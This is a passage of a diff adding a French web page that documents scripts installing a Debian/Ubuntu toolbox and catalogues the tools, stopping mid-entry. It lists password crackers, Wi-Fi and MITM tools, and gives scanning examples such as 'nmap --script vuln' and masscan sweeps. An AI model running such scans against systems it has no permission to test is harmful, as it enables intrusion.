@@ -1,0 +1,678 @@
+<?php $this->layout('layout::default', ['title' => 'Outils Tech - ebest.pro']) ?>
+
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#e6e7ee;
+  --bg-card:#e6e7ee;
+  --shadow-out:6px 6px 12px #b8b9be,-6px -6px 12px #ffffff;
+  --shadow-in:inset 3px 3px 6px #b8b9be,inset -3px -3px 6px #ffffff;
+  --shadow-sm:3px 3px 8px #b8b9be,-3px -3px 8px #ffffff;
+  --text:#44476a;
+  --text2:#6c6f93;
+  --text3:#9a9cb0;
+  --accent:#5b5ea6;
+  --accent-light:rgba(91,94,166,0.12);
+  --green:#4caf7d;
+  --green-light:rgba(76,175,125,0.12);
+  --yellow:#d49a2e;
+  --yellow-light:rgba(212,154,46,0.12);
+  --radius:14px;
+  --radius-sm:8px;
+  --font:'Segoe UI',system-ui,-apple-system,sans-serif;
+  --mono:'Cascadia Code','Fira Code','Courier New',monospace;
+}
+body{font-family:var(--font);background:var(--bg);color:var(--text);min-height:100vh}
+a{color:var(--accent)}
+
+/* ───────────────────────── HEADER ───────────────────────── */
+.header{background:var(--bg);box-shadow:var(--shadow-out);padding:1.1rem 2rem;display:flex;align-items:center;gap:1rem;position:sticky;top:0;z-index:100;margin-bottom:2rem}
+.header-logo{width:36px;height:36px;border-radius:50%;background:var(--bg);box-shadow:var(--shadow-out);display:flex;align-items:center;justify-content:center;font-size:16px;flex-shrink:0}
+.header-titles{display:flex;flex-direction:column;gap:2px}
+.header h1{font-size:1rem;font-weight:600;color:var(--text)}
+.header-sub{font-size:12px;color:var(--text2)}
+.header-sub a{color:var(--accent);text-decoration:none;border-bottom:1px dotted var(--accent)}
+.header-tag{font-size:11px;color:var(--text2);background:var(--bg);box-shadow:var(--shadow-in);padding:3px 12px;border-radius:20px;white-space:nowrap}
+.header-right{margin-left:auto;font-size:12px;color:var(--text3);white-space:nowrap}
+
+/* ───────────────────────── CONTAINER ───────────────────────── */
+.page-wrap{max-width:1100px;margin:0 auto;padding:0 1.5rem 3rem}
+
+/* ───────────────────────── HERO ───────────────────────── */
+.hero{display:grid;grid-template-columns:1fr 1fr;gap:2.5rem;align-items:center;padding:1rem 0 3rem}
+.hero-text .eyebrow{font-size:11px;letter-spacing:0.12em;text-transform:uppercase;color:var(--accent);font-weight:600;margin-bottom:10px}
+.hero-text h2{font-size:1.65rem;font-weight:600;color:var(--text);line-height:1.3;margin-bottom:14px}
+.hero-text p{font-size:14px;color:var(--text2);line-height:1.7;max-width:480px}
+.chips{display:flex;flex-wrap:wrap;gap:8px;margin-top:20px}
+.chip{font-family:var(--mono);font-size:11px;color:var(--text2);background:var(--bg);box-shadow:var(--shadow-sm);padding:5px 12px;border-radius:8px}
+
+/* terminal mock — seul élément sombre de la page, posé comme un écran sur le fond clair */
+.terminal-frame{background:var(--bg);box-shadow:var(--shadow-out);border-radius:var(--radius);padding:14px}
+.terminal-mock{
+  --t-bg:#0b0f0d; --t-line:#1f2b24; --t-fg:#d7e5dc; --t-fg-dim:#7c958a; --t-accent:#4ee08a; --t-amber:#e0a64e;
+  background:var(--t-bg);border-radius:8px;overflow:hidden;
+}
+.terminal-bar{display:flex;align-items:center;gap:8px;padding:10px 14px;background:#0e1411;border-bottom:1px solid var(--t-line);font-family:var(--mono);font-size:11px;color:var(--t-fg-dim)}
+.terminal-dot{width:9px;height:9px;border-radius:50%;display:inline-block}
+.terminal-dot.r{background:#e05d4e}.terminal-dot.y{background:var(--t-amber)}.terminal-dot.g{background:var(--t-accent)}
+.terminal-body{font-family:var(--mono);font-size:12.5px;color:var(--t-fg);padding:18px 16px 22px;white-space:pre;overflow-x:auto;line-height:1.6}
+.terminal-body .c1{color:var(--t-accent)}
+.terminal-body .c2{color:var(--t-amber)}
+.terminal-body .c3{color:var(--t-fg-dim)}
+.caret{display:inline-block;width:7px;height:14px;background:var(--t-accent);animation:blink 1s steps(1) infinite;vertical-align:-2px}
+@keyframes blink{50%{opacity:0}}
+@media(prefers-reduced-motion:reduce){.caret{animation:none}}
+
+/* ───────────────────────── QUICK NAV ───────────────────────── */
+.quicknav{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:2.5rem}
+.quicknav a{font-size:13px;font-weight:600;color:var(--text);text-decoration:none;background:var(--bg);box-shadow:var(--shadow-out);padding:10px 18px;border-radius:var(--radius);display:flex;align-items:center;gap:8px;transition:all .25s}
+.quicknav a:hover{color:#fff;background:var(--accent);box-shadow:4px 4px 10px rgba(91,94,166,0.3),-2px -2px 8px #ffffff}
+.quicknav a .qn-num{font-family:var(--mono);font-size:10px;font-weight:700;color:var(--accent);background:var(--accent-light);width:22px;height:22px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;flex-shrink:0;transition:all .25s}
+.quicknav a:hover .qn-num{color:#fff;background:rgba(255,255,255,0.25)}
+
+/* ───────────────────────── GENERIC SECTION ───────────────────────── */
+.section{padding:2.5rem 0;border-bottom:1px solid #d6d7e0}
+.section:last-of-type{border-bottom:none}
+.section .eyebrow{font-size:11px;letter-spacing:0.12em;text-transform:uppercase;color:var(--accent);font-weight:600;margin-bottom:8px}
+.section h3{font-size:1.3rem;font-weight:600;color:var(--text);margin-bottom:8px}
+.section > p.lead{font-size:13.5px;color:var(--text2);max-width:680px;margin-bottom:1.5rem}
+
+/* options grid */
+.opts{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px}
+.opt{background:var(--bg);box-shadow:var(--shadow-out);border-radius:var(--radius);padding:16px}
+.opt code{font-family:var(--mono);color:var(--accent);font-size:13px;display:block;margin-bottom:6px;font-weight:600}
+.opt span{color:var(--text2);font-size:12.5px;line-height:1.6}
+
+/* flow timeline */
+.flow{margin-top:6px;border-left:2px solid #d6d7e0;padding-left:22px}
+.flow-step{position:relative;padding-bottom:22px}
+.flow-step::before{content:"";position:absolute;left:-27px;top:3px;width:9px;height:9px;border-radius:50%;background:var(--bg);border:2px solid var(--accent)}
+.flow-step:last-child{padding-bottom:0}
+.flow-step h4{font-size:13.5px;font-weight:600;color:var(--text);margin-bottom:3px}
+.flow-step p{font-size:12.5px;color:var(--text2);line-height:1.6;max-width:600px}
+.flow-step code{font-family:var(--mono);color:var(--accent);background:var(--bg);box-shadow:var(--shadow-in);padding:1px 5px;border-radius:4px;font-size:11.5px}
+
+/* sections table */
+.table-card{background:var(--bg);box-shadow:var(--shadow-out);border-radius:var(--radius);overflow:hidden}
+table.sections-table{width:100%;border-collapse:collapse;font-size:12.5px}
+table.sections-table th{text-align:left;font-size:10.5px;letter-spacing:0.06em;text-transform:uppercase;color:var(--text3);padding:12px 16px;border-bottom:1px solid #d6d7e0;font-weight:600}
+table.sections-table td{padding:10px 16px;border-bottom:1px solid #e2e3ea;vertical-align:top;color:var(--text)}
+table.sections-table tbody tr:last-child td{border-bottom:none}
+table.sections-table tbody tr:hover{background:rgba(91,94,166,0.045)}
+td.num{font-family:var(--mono);color:var(--accent);width:32px}
+td.name{font-weight:600;white-space:nowrap}
+td.tools{color:var(--text2);font-family:var(--mono);font-size:11.5px}
+.pill{display:inline-block;font-family:var(--mono);font-size:10px;color:var(--yellow);background:var(--yellow-light);border-radius:10px;padding:2px 8px;margin-left:8px;vertical-align:1px}
+
+/* technical cards */
+.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:14px}
+.card{background:var(--bg);box-shadow:var(--shadow-out);border-radius:var(--radius);padding:18px}
+.card .k{font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.06em;color:var(--accent);margin-bottom:8px;display:block}
+.card p{font-size:12.5px;color:var(--text2);line-height:1.65;margin:0}
+.card code{font-family:var(--mono);color:var(--accent);background:rgba(91,94,166,0.08);padding:1px 5px;border-radius:4px;font-size:11.5px}
+
+/* manual list */
+.manual-list{list-style:none;display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:10px}
+.manual-list li{background:var(--bg);box-shadow:var(--shadow-sm);border-radius:var(--radius-sm);padding:12px 14px;font-size:12.5px;display:flex;justify-content:space-between;align-items:center;gap:10px}
+.manual-list a{color:var(--text2);text-decoration:none;font-size:11.5px;border-bottom:1px dotted var(--text3)}
+.manual-list a:hover{color:var(--accent);border-color:var(--accent)}
+
+/* ───────────────────────── CATALOGUE (sidebar + grid) ───────────────────────── */
+.catalogue-intro{margin-bottom:1.5rem}
+.layout{display:flex;min-height:400px;gap:0}
+.sidebar{width:200px;flex-shrink:0;margin-right:1.5rem}
+.main{flex:1;min-width:0}
+.sidebar-card{background:var(--bg);border-radius:var(--radius);box-shadow:var(--shadow-out);padding:1rem 0;position:sticky;top:90px}
+.sidebar-title{font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:0.12em;padding:0 1rem 0.75rem;font-weight:600}
+.cat-btn{display:flex;align-items:center;gap:8px;width:100%;padding:8px 1rem;font-size:13px;color:var(--text2);cursor:pointer;border:none;background:none;text-align:left;transition:all 0.2s;font-family:var(--font)}
+.cat-btn:hover{color:var(--text)}
+.cat-btn.active{color:var(--accent)}
+.cat-btn.active .cat-label{background:var(--bg);box-shadow:var(--shadow-in);border-radius:8px;padding:2px 6px}
+.cat-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0;box-shadow:2px 2px 4px rgba(0,0,0,0.15)}
+.cat-count{margin-left:auto;font-size:11px;color:var(--text3)}
+
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:1.5rem}
+.stat{background:var(--bg);border-radius:var(--radius);box-shadow:var(--shadow-out);padding:14px 16px}
+.stat-n{font-size:26px;font-weight:300;color:var(--accent)}
+.stat-l{font-size:11px;color:var(--text2);margin-top:3px;text-transform:uppercase;letter-spacing:0.05em}
+
+.search-wrap{margin-bottom:1.5rem}
+.search-wrap input{width:100%;padding:11px 16px;background:var(--bg);border:none;border-radius:var(--radius);box-shadow:var(--shadow-in);color:var(--text);font-size:14px;outline:none;font-family:var(--font);transition:box-shadow 0.2s}
+.search-wrap input:focus{box-shadow:var(--shadow-in),0 0 0 2px var(--accent-light)}
+.search-wrap input::placeholder{color:var(--text3)}
+
+.cat-section{margin-bottom:2rem}
+.cat-header{display:flex;align-items:center;gap:10px;margin-bottom:12px}
+.cat-name{font-size:15px;font-weight:600;color:var(--text)}
+.cat-badge{font-size:11px;color:var(--text3);background:var(--bg);box-shadow:var(--shadow-in);padding:2px 10px;border-radius:20px;margin-left:auto}
+
+.tools-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(310px,1fr));gap:12px}
+.tool-card{background:var(--bg);border-radius:var(--radius);box-shadow:var(--shadow-out);overflow:hidden;cursor:pointer;transition:box-shadow 0.2s}
+.tool-card:hover{box-shadow:4px 4px 10px #b8b9be,-4px -4px 10px #ffffff}
+.tool-card.open{box-shadow:var(--shadow-in)}
+.tool-top{display:flex;align-items:center;gap:10px;padding:13px 15px}
+.tool-dot2{width:9px;height:9px;border-radius:50%;flex-shrink:0;box-shadow:2px 2px 4px rgba(0,0,0,0.2)}
+.tool-name{font-size:13px;font-weight:600;color:var(--text);flex:1}
+.tool-badge{font-size:11px;padding:3px 10px;border-radius:20px;font-weight:500}
+.badge-ok{background:var(--green-light);color:var(--green)}
+.badge-warn{background:var(--yellow-light);color:var(--yellow)}
+.tool-arrow{font-size:10px;color:var(--text3);transition:transform 0.25s;background:var(--bg);box-shadow:var(--shadow-sm);width:22px;height:22px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.tool-card.open .tool-arrow{transform:rotate(90deg);box-shadow:var(--shadow-in)}
+.tool-body{display:none;padding:0 15px 15px}
+.tool-card.open .tool-body{display:block;padding-top:0}
+.tool-divider{height:1px;background:linear-gradient(to right,transparent,#c8c9d0,transparent);margin-bottom:12px}
+.tool-desc{font-size:12px;color:var(--text2);line-height:1.7;margin-bottom:10px}
+.example-label{font-size:10px;color:var(--text3);margin-bottom:6px;text-transform:uppercase;letter-spacing:0.08em;font-weight:600}
+.example-code{background:var(--bg);border-radius:var(--radius-sm);box-shadow:var(--shadow-in);padding:10px 12px;font-family:var(--mono);font-size:11px;color:#5b5ea6;white-space:pre;overflow-x:auto;line-height:1.7}
+
+.no-results{text-align:center;padding:4rem;color:var(--text3);font-size:14px;background:var(--bg);border-radius:var(--radius);box-shadow:var(--shadow-out)}
+
+::-webkit-scrollbar{width:5px;height:5px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:#c8c9d0;border-radius:3px}
+
+footer.page-footer{padding:2rem 0 1rem;font-family:var(--mono);font-size:11.5px;color:var(--text3);text-align:center}
+footer.page-footer span{color:var(--accent)}
+
+@media(max-width:860px){
+  .hero{grid-template-columns:1fr}
+  .layout{flex-direction:column}
+  .sidebar{width:100%;margin-right:0;margin-bottom:1rem}
+  .sidebar-card{position:static}
+  .stats{grid-template-columns:repeat(2,1fr)}
+  .header{padding:1rem 1.25rem}
+  .header-right{display:none}
+}
+</style>
+
+<div class="header">
+  <div class="header-logo">🛠️</div>
+  <div class="header-titles">
+    <h1>Outils Tech</h1>
+    <span class="header-sub">Scripts : <a href="https://ebest.pro/scripts?file=install_tech_tools.sh">install_tech_tools.sh</a> · <a href="https://ebest.pro/scripts?file=post_install_tech_tools.sh">post_install_tech_tools.sh</a></span>
+  </div>
+  <span class="header-tag">Debian / Ubuntu</span>
+  <div class="header-right" id="hcount"></div>
+</div>
+
+<div class="page-wrap">
+
+  <!-- ───────── HERO ───────── -->
+  <div class="hero">
+    <div class="terminal-frame">
+      <div class="terminal-mock">
+        <div class="terminal-bar">
+          <span class="terminal-dot r"></span><span class="terminal-dot y"></span><span class="terminal-dot g"></span>
+          <span style="margin-left:8px;">root@debian: ~/tech-tools</span>
+        </div>
+        <div class="terminal-body">$ sudo ./<span class="c1">install_tech_tools.sh</span> <span class="c2">--dry-run</span>
+<span class="c3">[INFO]  Tech Tools Installer</span>
+<span class="c3">[INFO]  Distribution : debian (bookworm)</span>
+<span class="c3">[INFO]  Log : /var/log/tech_tools_install_20260620.log</span>
+<span class="c3">[INFO]  Mode dry-run : true</span><span class="caret"></span></div>
+      </div>
+    </div>
+    <div class="hero-text">
+      <div class="eyebrow">Installation automatisée</div>
+      <h2>Un poste tech complet sur Debian ou Ubuntu, en deux scripts</h2>
+      <p>Deux scripts bash complémentaires : le premier installe les outils — réseau, forensics, mots de passe, virtualisation, DevOps, IA — sur Debian ou Ubuntu, avec détection automatique de la distribution. Le second configure les services, groupes et modules noyau.</p>
+      <div class="chips">
+        <span class="chip">bash · set -euo pipefail</span>
+        <span class="chip">27 sections</span>
+        <span class="chip">300+ paquets</span>
+        <span class="chip">Debian + Ubuntu</span>
+        <span class="chip">apt + curl + npm</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ───────── NAV RAPIDE ───────── -->
+  <div class="quicknav">
+    <a href="#usage"><span class="qn-num">01</span>Utilisation</a>
+    <a href="#flow"><span class="qn-num">02</span>Déroulé</a>
+    <a href="#sections"><span class="qn-num">03</span>Sections</a>
+    <a href="#postinstall"><span class="qn-num">04</span>Post-installation</a>
+    <a href="#tech"><span class="qn-num">05</span>Points techniques</a>
+    <a href="#manual"><span class="qn-num">06</span>Hors script</a>
+    <a href="#catalogue"><span class="qn-num">07</span>Catalogue</a>
+  </div>
+
+  <!-- ───────── USAGE ───────── -->
+  <div class="section" id="usage">
+    <div class="eyebrow">01 — Utilisation</div>
+    <h3>Deux scripts, trois options chacun</h3>
+    <p class="lead">Les deux scripts s'exécutent en root et acceptent un mode simulation ainsi qu'un filtre par section.</p>
+    <div class="opts">
+      <div class="opt"><code>sudo ./install_tech_tools.sh</code><span>Installe les 300+ paquets et outils. Script principal à exécuter en premier.</span></div>
+      <div class="opt"><code>sudo ./post_install_tech_tools.sh</code><span>Configure les services, groupes utilisateur, modules noyau et fichiers de configuration après l'installation.</span></div>
+      <div class="opt"><code>--dry-run</code><span>Affiche chaque commande sans rien exécuter. Idéal pour vérifier la liste avant de lancer pour de vrai.</span></div>
+      <div class="opt"><code>--section SECTION</code><span>Limite l'exécution à une seule section (ex. <em>network</em>, <em>forensics</em>, <em>devops</em>, <em>ai</em>).</span></div>
+    </div>
+  </div>
+
+  <!-- ───────── DÉROULÉ ───────── -->
+  <div class="section" id="flow">
+    <div class="eyebrow">02 — Déroulé</div>
+    <h3>Ce qui se passe à l'exécution</h3>
+    <div class="flow">
+      <div class="flow-step">
+        <h4>1. Détection de la distribution</h4>
+        <p>Le script lit <code>/etc/os-release</code> pour identifier Debian, Ubuntu ou Pop!_OS, et adapte automatiquement les dépôts et commandes en conséquence.</p>
+      </div>
+      <div class="flow-step">
+        <h4>2. Mise à jour des dépôts</h4>
+        <p><code>apt-get update</code>, puis activation de <em>universe + multiverse</em> (Ubuntu) ou <em>contrib + non-free</em> (Debian).</p>
+      </div>
+      <div class="flow-step">
+        <h4>3. Dépôts tiers</h4>
+        <p>Ajout des clés et sources Docker (adapté debian/ubuntu), PPA Ansible (Ubuntu uniquement), et WireGuard (inclus kernel 5.6+).</p>
+      </div>
+      <div class="flow-step">
+        <h4>4. Installation paquet par paquet</h4>
+        <p>Pour chaque section, la fonction <code>apt_install()</code> teste chaque paquet via <code>apt-cache show</code> avant de l'installer — les paquets introuvables sont listés en avertissement plutôt que de faire échouer tout le bloc.</p>
+      </div>
+      <div class="flow-step">
+        <h4>5. Cas particuliers</h4>
+        <p>VirtualBox (dépôt Oracle), kubectl / minikube / lazydocker (binaires GitHub), GNS3 (PPA ou pip), PowerShell (packages.microsoft.com avec fallback .deb), AnonSurf (compilation Nim), Ollama et Claude Code.</p>
+      </div>
+      <div class="flow-step">
+        <h4>6. Post-installation</h4>
+        <p>Le second script <code>post_install_tech_tools.sh</code> configure les groupes utilisateur (docker, wireshark, libvirt…), active les services systemd, initialise les bases de données (ClamAV, rkhunter, lm-sensors) et charge les modules noyau (KVM, VirtualBox).</p>
+      </div>
+      <div class="flow-step">
+        <h4>7. Résumé final</h4>
+        <p>Chaque script rappelle où trouver le log complet et liste les outils qui demandent une installation manuelle.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- ───────── SECTIONS ───────── -->
+  <div class="section" id="sections">
+    <div class="eyebrow">03 — Couverture</div>
+    <h3>27 sections, du disque au cloud</h3>
+    <p class="lead">Chaque section correspond à un identifiant utilisable avec <code style="font-family:var(--mono);color:var(--accent);">--section</code>.</p>
+    <div class="table-card">
+      <table class="sections-table">
+        <thead><tr><th>#</th><th>Section</th><th>Quelques outils</th></tr></thead>
+        <tbody>
+          <tr><td class="num">01</td><td class="name">Maintenance disques & hardware</td><td class="tools">smartmontools, lshw, stress-ng, clamav, lm-sensors, inxi</td></tr>
+          <tr><td class="num">02</td><td class="name">Clonage & sauvegarde disque</td><td class="tools">clonezilla, dcfldd, dc3dd, fsarchiver, guymager</td></tr>
+          <tr><td class="num">03</td><td class="name">Mots de passe & crypto</td><td class="tools">hashcat, hydra, john, ophcrack, crunch, fcrackzip</td></tr>
+          <tr><td class="num">04</td><td class="name">Partitionnement & effacement</td><td class="tools">gparted, nwipe, secure-delete, bleachbit, scrub</td></tr>
+          <tr><td class="num">05</td><td class="name">Protection des données</td><td class="tools">cryptsetup, fscrypt, zulucrypt</td></tr>
+          <tr><td class="num">06</td><td class="name">Forensics & récupération</td><td class="tools">ddrescue, foremost, scalpel, sleuthkit, autopsy</td></tr>
+          <tr><td class="num">07</td><td class="name">Fichiers dupliqués</td><td class="tools">fdupes, rdfind, dupeguru</td></tr>
+          <tr><td class="num">08</td><td class="name">Réseau — DHCP / DNS / IP</td><td class="tools">dhcpdump, bind9-dnsutils, ethtool, iproute2, traceroute</td></tr>
+          <tr><td class="num">09</td><td class="name">Réseau — monitoring & capture</td><td class="tools">wireshark, tcpdump, tshark, scapy, iftop, nethogs</td></tr>
+          <tr><td class="num">10</td><td class="name">Réseau — scanners & pentest</td><td class="tools">nmap, ettercap, bettercap, masscan, netdiscover, mitmproxy</td></tr>
+          <tr><td class="num">11</td><td class="name">SSL/TLS</td><td class="tools">sslscan, ssldump, sslsplit</td></tr>
+          <tr><td class="num">12</td><td class="name">Wi-Fi</td><td class="tools">aircrack-ng, iw, rfkill, linssid</td></tr>
+          <tr><td class="num">13</td><td class="name">VPN</td><td class="tools">openvpn, wireguard, openfortivpn, network-manager</td></tr>
+          <tr><td class="num">14</td><td class="name">Anonymisation <span class="pill">Tor + AnonSurf</span></td><td class="tools">tor, torsocks, torbrowser-launcher, anonsurf, macchanger</td></tr>
+          <tr><td class="num">15</td><td class="name">Console série & divers réseau</td><td class="tools">minicom, picocom, socat, tftp-hpa, screen</td></tr>
+          <tr><td class="num">16</td><td class="name">Administration à distance</td><td class="tools">rdesktop, freerdp, remmina, tmux, sshpass, clusterssh</td></tr>
+          <tr><td class="num">17</td><td class="name">Sauvegardes</td><td class="tools">restic, borgbackup, rclone, duplicity, bacula</td></tr>
+          <tr><td class="num">18</td><td class="name">FTP</td><td class="tools">filezilla, gftp, lftp</td></tr>
+          <tr><td class="num">19</td><td class="name">Virtualisation <span class="pill">dépôt Oracle</span></td><td class="tools">virt-manager, qemu, libvirt, virtualbox, lxc</td></tr>
+          <tr><td class="num">20</td><td class="name">Système & administration</td><td class="tools">apparmor, krb5, apache2-utils, mariadb-client, postgresql-client</td></tr>
+          <tr><td class="num">21</td><td class="name">DevOps & cloud <span class="pill">binaires GitHub</span></td><td class="tools">docker, ansible, podman, kubectl, minikube, lazydocker</td></tr>
+          <tr><td class="num">22</td><td class="name">Systèmes de fichiers</td><td class="tools">zfs, btrfs, lvm2, ntfs-3g, hfsplus, exfatprogs</td></tr>
+          <tr><td class="num">23</td><td class="name">Snapshots système</td><td class="tools">timeshift, snapper, btrbk</td></tr>
+          <tr><td class="num">24</td><td class="name">Outils divers</td><td class="tools">htop, btop, jq, yq, keepassxc, p7zip, zstd</td></tr>
+          <tr><td class="num">25</td><td class="name">GNS3 <span class="pill">PPA / pip</span></td><td class="tools">gns3-gui, gns3-server, dynamips, vpcs</td></tr>
+          <tr><td class="num">26</td><td class="name">PowerShell <span class="pill">Microsoft repo</span></td><td class="tools">pwsh</td></tr>
+          <tr><td class="num">27</td><td class="name">Outils IA <span class="pill">npm + curl</span></td><td class="tools">ollama, claude-code, open-webui, python3-venv</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ───────── POST-INSTALL ───────── -->
+  <div class="section" id="postinstall">
+    <div class="eyebrow">04 — Post-installation</div>
+    <h3>Ce que configure le second script</h3>
+    <p class="lead"><code style="font-family:var(--mono);color:var(--accent);">post_install_tech_tools.sh</code> — à exécuter après l'installation pour finaliser la configuration du système.</p>
+    <div class="cards">
+      <div class="card">
+        <span class="k">Groupes utilisateur</span>
+        <p>Ajout automatique aux groupes <code>docker</code>, <code>wireshark</code>, <code>libvirt</code>, <code>kvm</code>, <code>vboxusers</code>, <code>dialout</code> et <code>scanner</code>. Reconfiguration de Wireshark pour la capture non-root.</p>
+      </div>
+      <div class="card">
+        <span class="k">Services systemd</span>
+        <p>Activation de ClamAV, Docker, libvirtd, AppArmor, Chrony (NTP), smartd, chkrootkit timer, plocate updatedb et Ollama.</p>
+      </div>
+      <div class="card">
+        <span class="k">Bases de données</span>
+        <p>Signatures ClamAV, base rkhunter (avec correction de <code>WEB_CMD</code>), détection lm-sensors, base plocate, config Snapper (btrfs) et initialisation fscrypt.</p>
+      </div>
+      <div class="card">
+        <span class="k">Modules noyau</span>
+        <p>Chargement KVM (Intel VT-x / AMD-V), modules VirtualBox (avec rebuild DKMS si nécessaire) et <code>nbd</code> pour le montage d'images QEMU.</p>
+      </div>
+      <div class="card">
+        <span class="k">Fichiers de configuration</span>
+        <p>Docker <code>daemon.json</code> (log rotation), sauvegarde iptables, configuration darkstat, vérification AnonSurf, Ollama et Tor.</p>
+      </div>
+      <div class="card">
+        <span class="k">Vérifications finales</span>
+        <p>Tableau d'état de tous les services critiques, vérification des outils IA (Ollama, Claude Code, Open WebUI) et rappel des actions manuelles restantes.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- ───────── TECH ───────── -->
+  <div class="section" id="tech">
+    <div class="eyebrow">05 — Points techniques</div>
+    <h3>Ce qui rend les scripts robustes</h3>
+    <div class="cards">
+      <div class="card">
+        <span class="k">Détection Debian / Ubuntu</span>
+        <p>Lecture de <code>/etc/os-release</code> pour identifier la distribution. Les dépôts tiers (Docker, Ansible PPA, contrib/non-free vs universe/multiverse) sont adaptés automatiquement.</p>
+      </div>
+      <div class="card">
+        <span class="k">Tolérance aux paquets manquants</span>
+        <p>Chaque paquet est vérifié via <code>apt-cache show</code> avant la tentative d'installation. Les absents sont listés en avertissement, le reste de la section continue normalement.</p>
+      </div>
+      <div class="card">
+        <span class="k">Mode strict</span>
+        <p><code>set -euo pipefail</code> en tête de script : arrêt immédiat sur erreur ou variable non définie, pour éviter les installations partielles silencieuses.</p>
+      </div>
+      <div class="card">
+        <span class="k">Journalisation complète</span>
+        <p>Toute la sortie est dupliquée vers un fichier de log horodaté dans <code>/var/log/</code>, utile pour diagnostiquer après coup un paquet en échec.</p>
+      </div>
+      <div class="card">
+        <span class="k">Sorties du circuit apt</span>
+        <p>VirtualBox (Oracle), kubectl, minikube, lazydocker (GitHub), PowerShell (Microsoft avec fallback .deb), AnonSurf (compilation Nim), Ollama et Claude Code sont récupérés depuis leurs sources officielles.</p>
+      </div>
+      <div class="card">
+        <span class="k">Idempotence</span>
+        <p>Chaque outil est testé avec <code>command -v</code> avant installation. Les dépôts ne sont ajoutés que s'ils sont absents. Le post-install vérifie groupes et services avant d'agir.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- ───────── MANUEL ───────── -->
+  <div class="section" id="manual">
+    <div class="eyebrow">06 — Hors script</div>
+    <h3>Ce qui reste à installer à la main</h3>
+    <p class="lead">Le script l'annonce en fin d'exécution : certains outils ne sont pas packagés pour Debian/Ubuntu et doivent être installés séparément.</p>
+    <ul class="manual-list">
+      <li>VeraCrypt <a href="https://www.veracrypt.fr/en/Downloads.html" target="_blank" rel="noopener">veracrypt.fr</a></li>
+      <li>Exegol <a href="https://exegol.readthedocs.io" target="_blank" rel="noopener">exegol.readthedocs.io</a></li>
+      <li>Azure CLI <a href="https://learn.microsoft.com/cli/azure/install-azure-cli-linux" target="_blank" rel="noopener">learn.microsoft.com</a></li>
+      <li>Terraform <a href="https://developer.hashicorp.com/terraform/downloads" target="_blank" rel="noopener">developer.hashicorp.com</a></li>
+      <li>Helm <a href="https://helm.sh/docs/intro/install/" target="_blank" rel="noopener">helm.sh</a></li>
+      <li>Vagrant <a href="https://developer.hashicorp.com/vagrant/downloads" target="_blank" rel="noopener">developer.hashicorp.com</a></li>
+      <li>Packer <a href="https://developer.hashicorp.com/packer/downloads" target="_blank" rel="noopener">developer.hashicorp.com</a></li>
+      <li>AWS CLI <a href="https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html" target="_blank" rel="noopener">docs.aws.amazon.com</a></li>
+      <li>SSLyze <a href="https://pypi.org/project/sslyze/" target="_blank" rel="noopener">pip3 install sslyze</a></li>
+      <li>LazyGit <a href="https://github.com/jesseduffield/lazygit#installation" target="_blank" rel="noopener">github.com/jesseduffield</a></li>
+      <li>VSCodium <a href="https://vscodium.com/#install" target="_blank" rel="noopener">vscodium.com</a></li>
+      <li>Cursor <a href="https://www.cursor.com/downloads" target="_blank" rel="noopener">cursor.com</a></li>
+      <li>LM Studio <a href="https://lmstudio.ai/" target="_blank" rel="noopener">lmstudio.ai</a></li>
+    </ul>
+  </div>
+
+  <!-- ───────── CATALOGUE INTERACTIF ───────── -->
+  <div class="section" id="catalogue" style="border-bottom:none">
+    <div class="eyebrow">07 — Catalogue</div>
+    <h3>Outils installés, prêts à l'emploi</h3>
+    <p class="lead catalogue-intro">Recherchez par nom, filtrez par catégorie, et dépliez une carte pour voir un exemple d'usage concret de chaque outil.</p>
+
+    <div class="layout">
+      <div class="sidebar">
+        <div class="sidebar-card">
+          <div class="sidebar-title">Catégories</div>
+          <div id="sidebar"></div>
+        </div>
+      </div>
+      <div class="main">
+        <div class="stats" id="stats"></div>
+        <div class="search-wrap"><input type="text" id="search" placeholder="Rechercher un outil..." oninput="render()"></div>
+        <div id="content"></div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<footer class="page-footer">
+  install_tech_tools.sh + post_install_tech_tools.sh — <span>27 sections</span> · Debian / Ubuntu · log dans /var/log/tech_tools_install_*.log
+</footer>
+
+<script>
+const TOOLS = [
+  {name:`Wireshark`,cat:`Network`,status:`ok`,desc:`Analyseur de trafic réseau en temps réel. Capture et inspecte les paquets sur toutes les interfaces réseau.`,example:`wireshark
+# Sélectionner l'interface eth0 ou wlan0
+# Filtre: http.request.method == POST
+# Filtre: ip.addr == 192.168.1.1`},
+  {name:`Nmap`,cat:`Network`,status:`ok`,desc:`Scanner de ports et de services réseau. Détecte les hôtes actifs, ports ouverts et versions de services.`,example:`nmap -sV -sC -oN scan.txt 192.168.1.1
+nmap -p 1-65535 -T4 192.168.1.0/24
+nmap --script vuln 192.168.1.1`},
+  {name:`Arp-scan`,cat:`Network`,status:`ok`,desc:`Scan ARP pour découvrir tous les hôtes actifs sur le réseau local.`,example:`sudo arp-scan -l
+sudo arp-scan --interface=eth0 192.168.1.0/24`},
+  {name:`Masscan`,cat:`Network`,status:`ok`,desc:`Scanner de ports ultra-rapide.`,example:`sudo masscan -p80,443 192.168.1.0/24 --rate=1000
+sudo masscan -p1-65535 10.0.0.1 --rate=10000`},
+  {name:`Tcpdump`,cat:`Network`,status:`ok`,desc:`Capture de paquets en ligne de commande.`,example:`sudo tcpdump -i eth0 -w capture.pcap
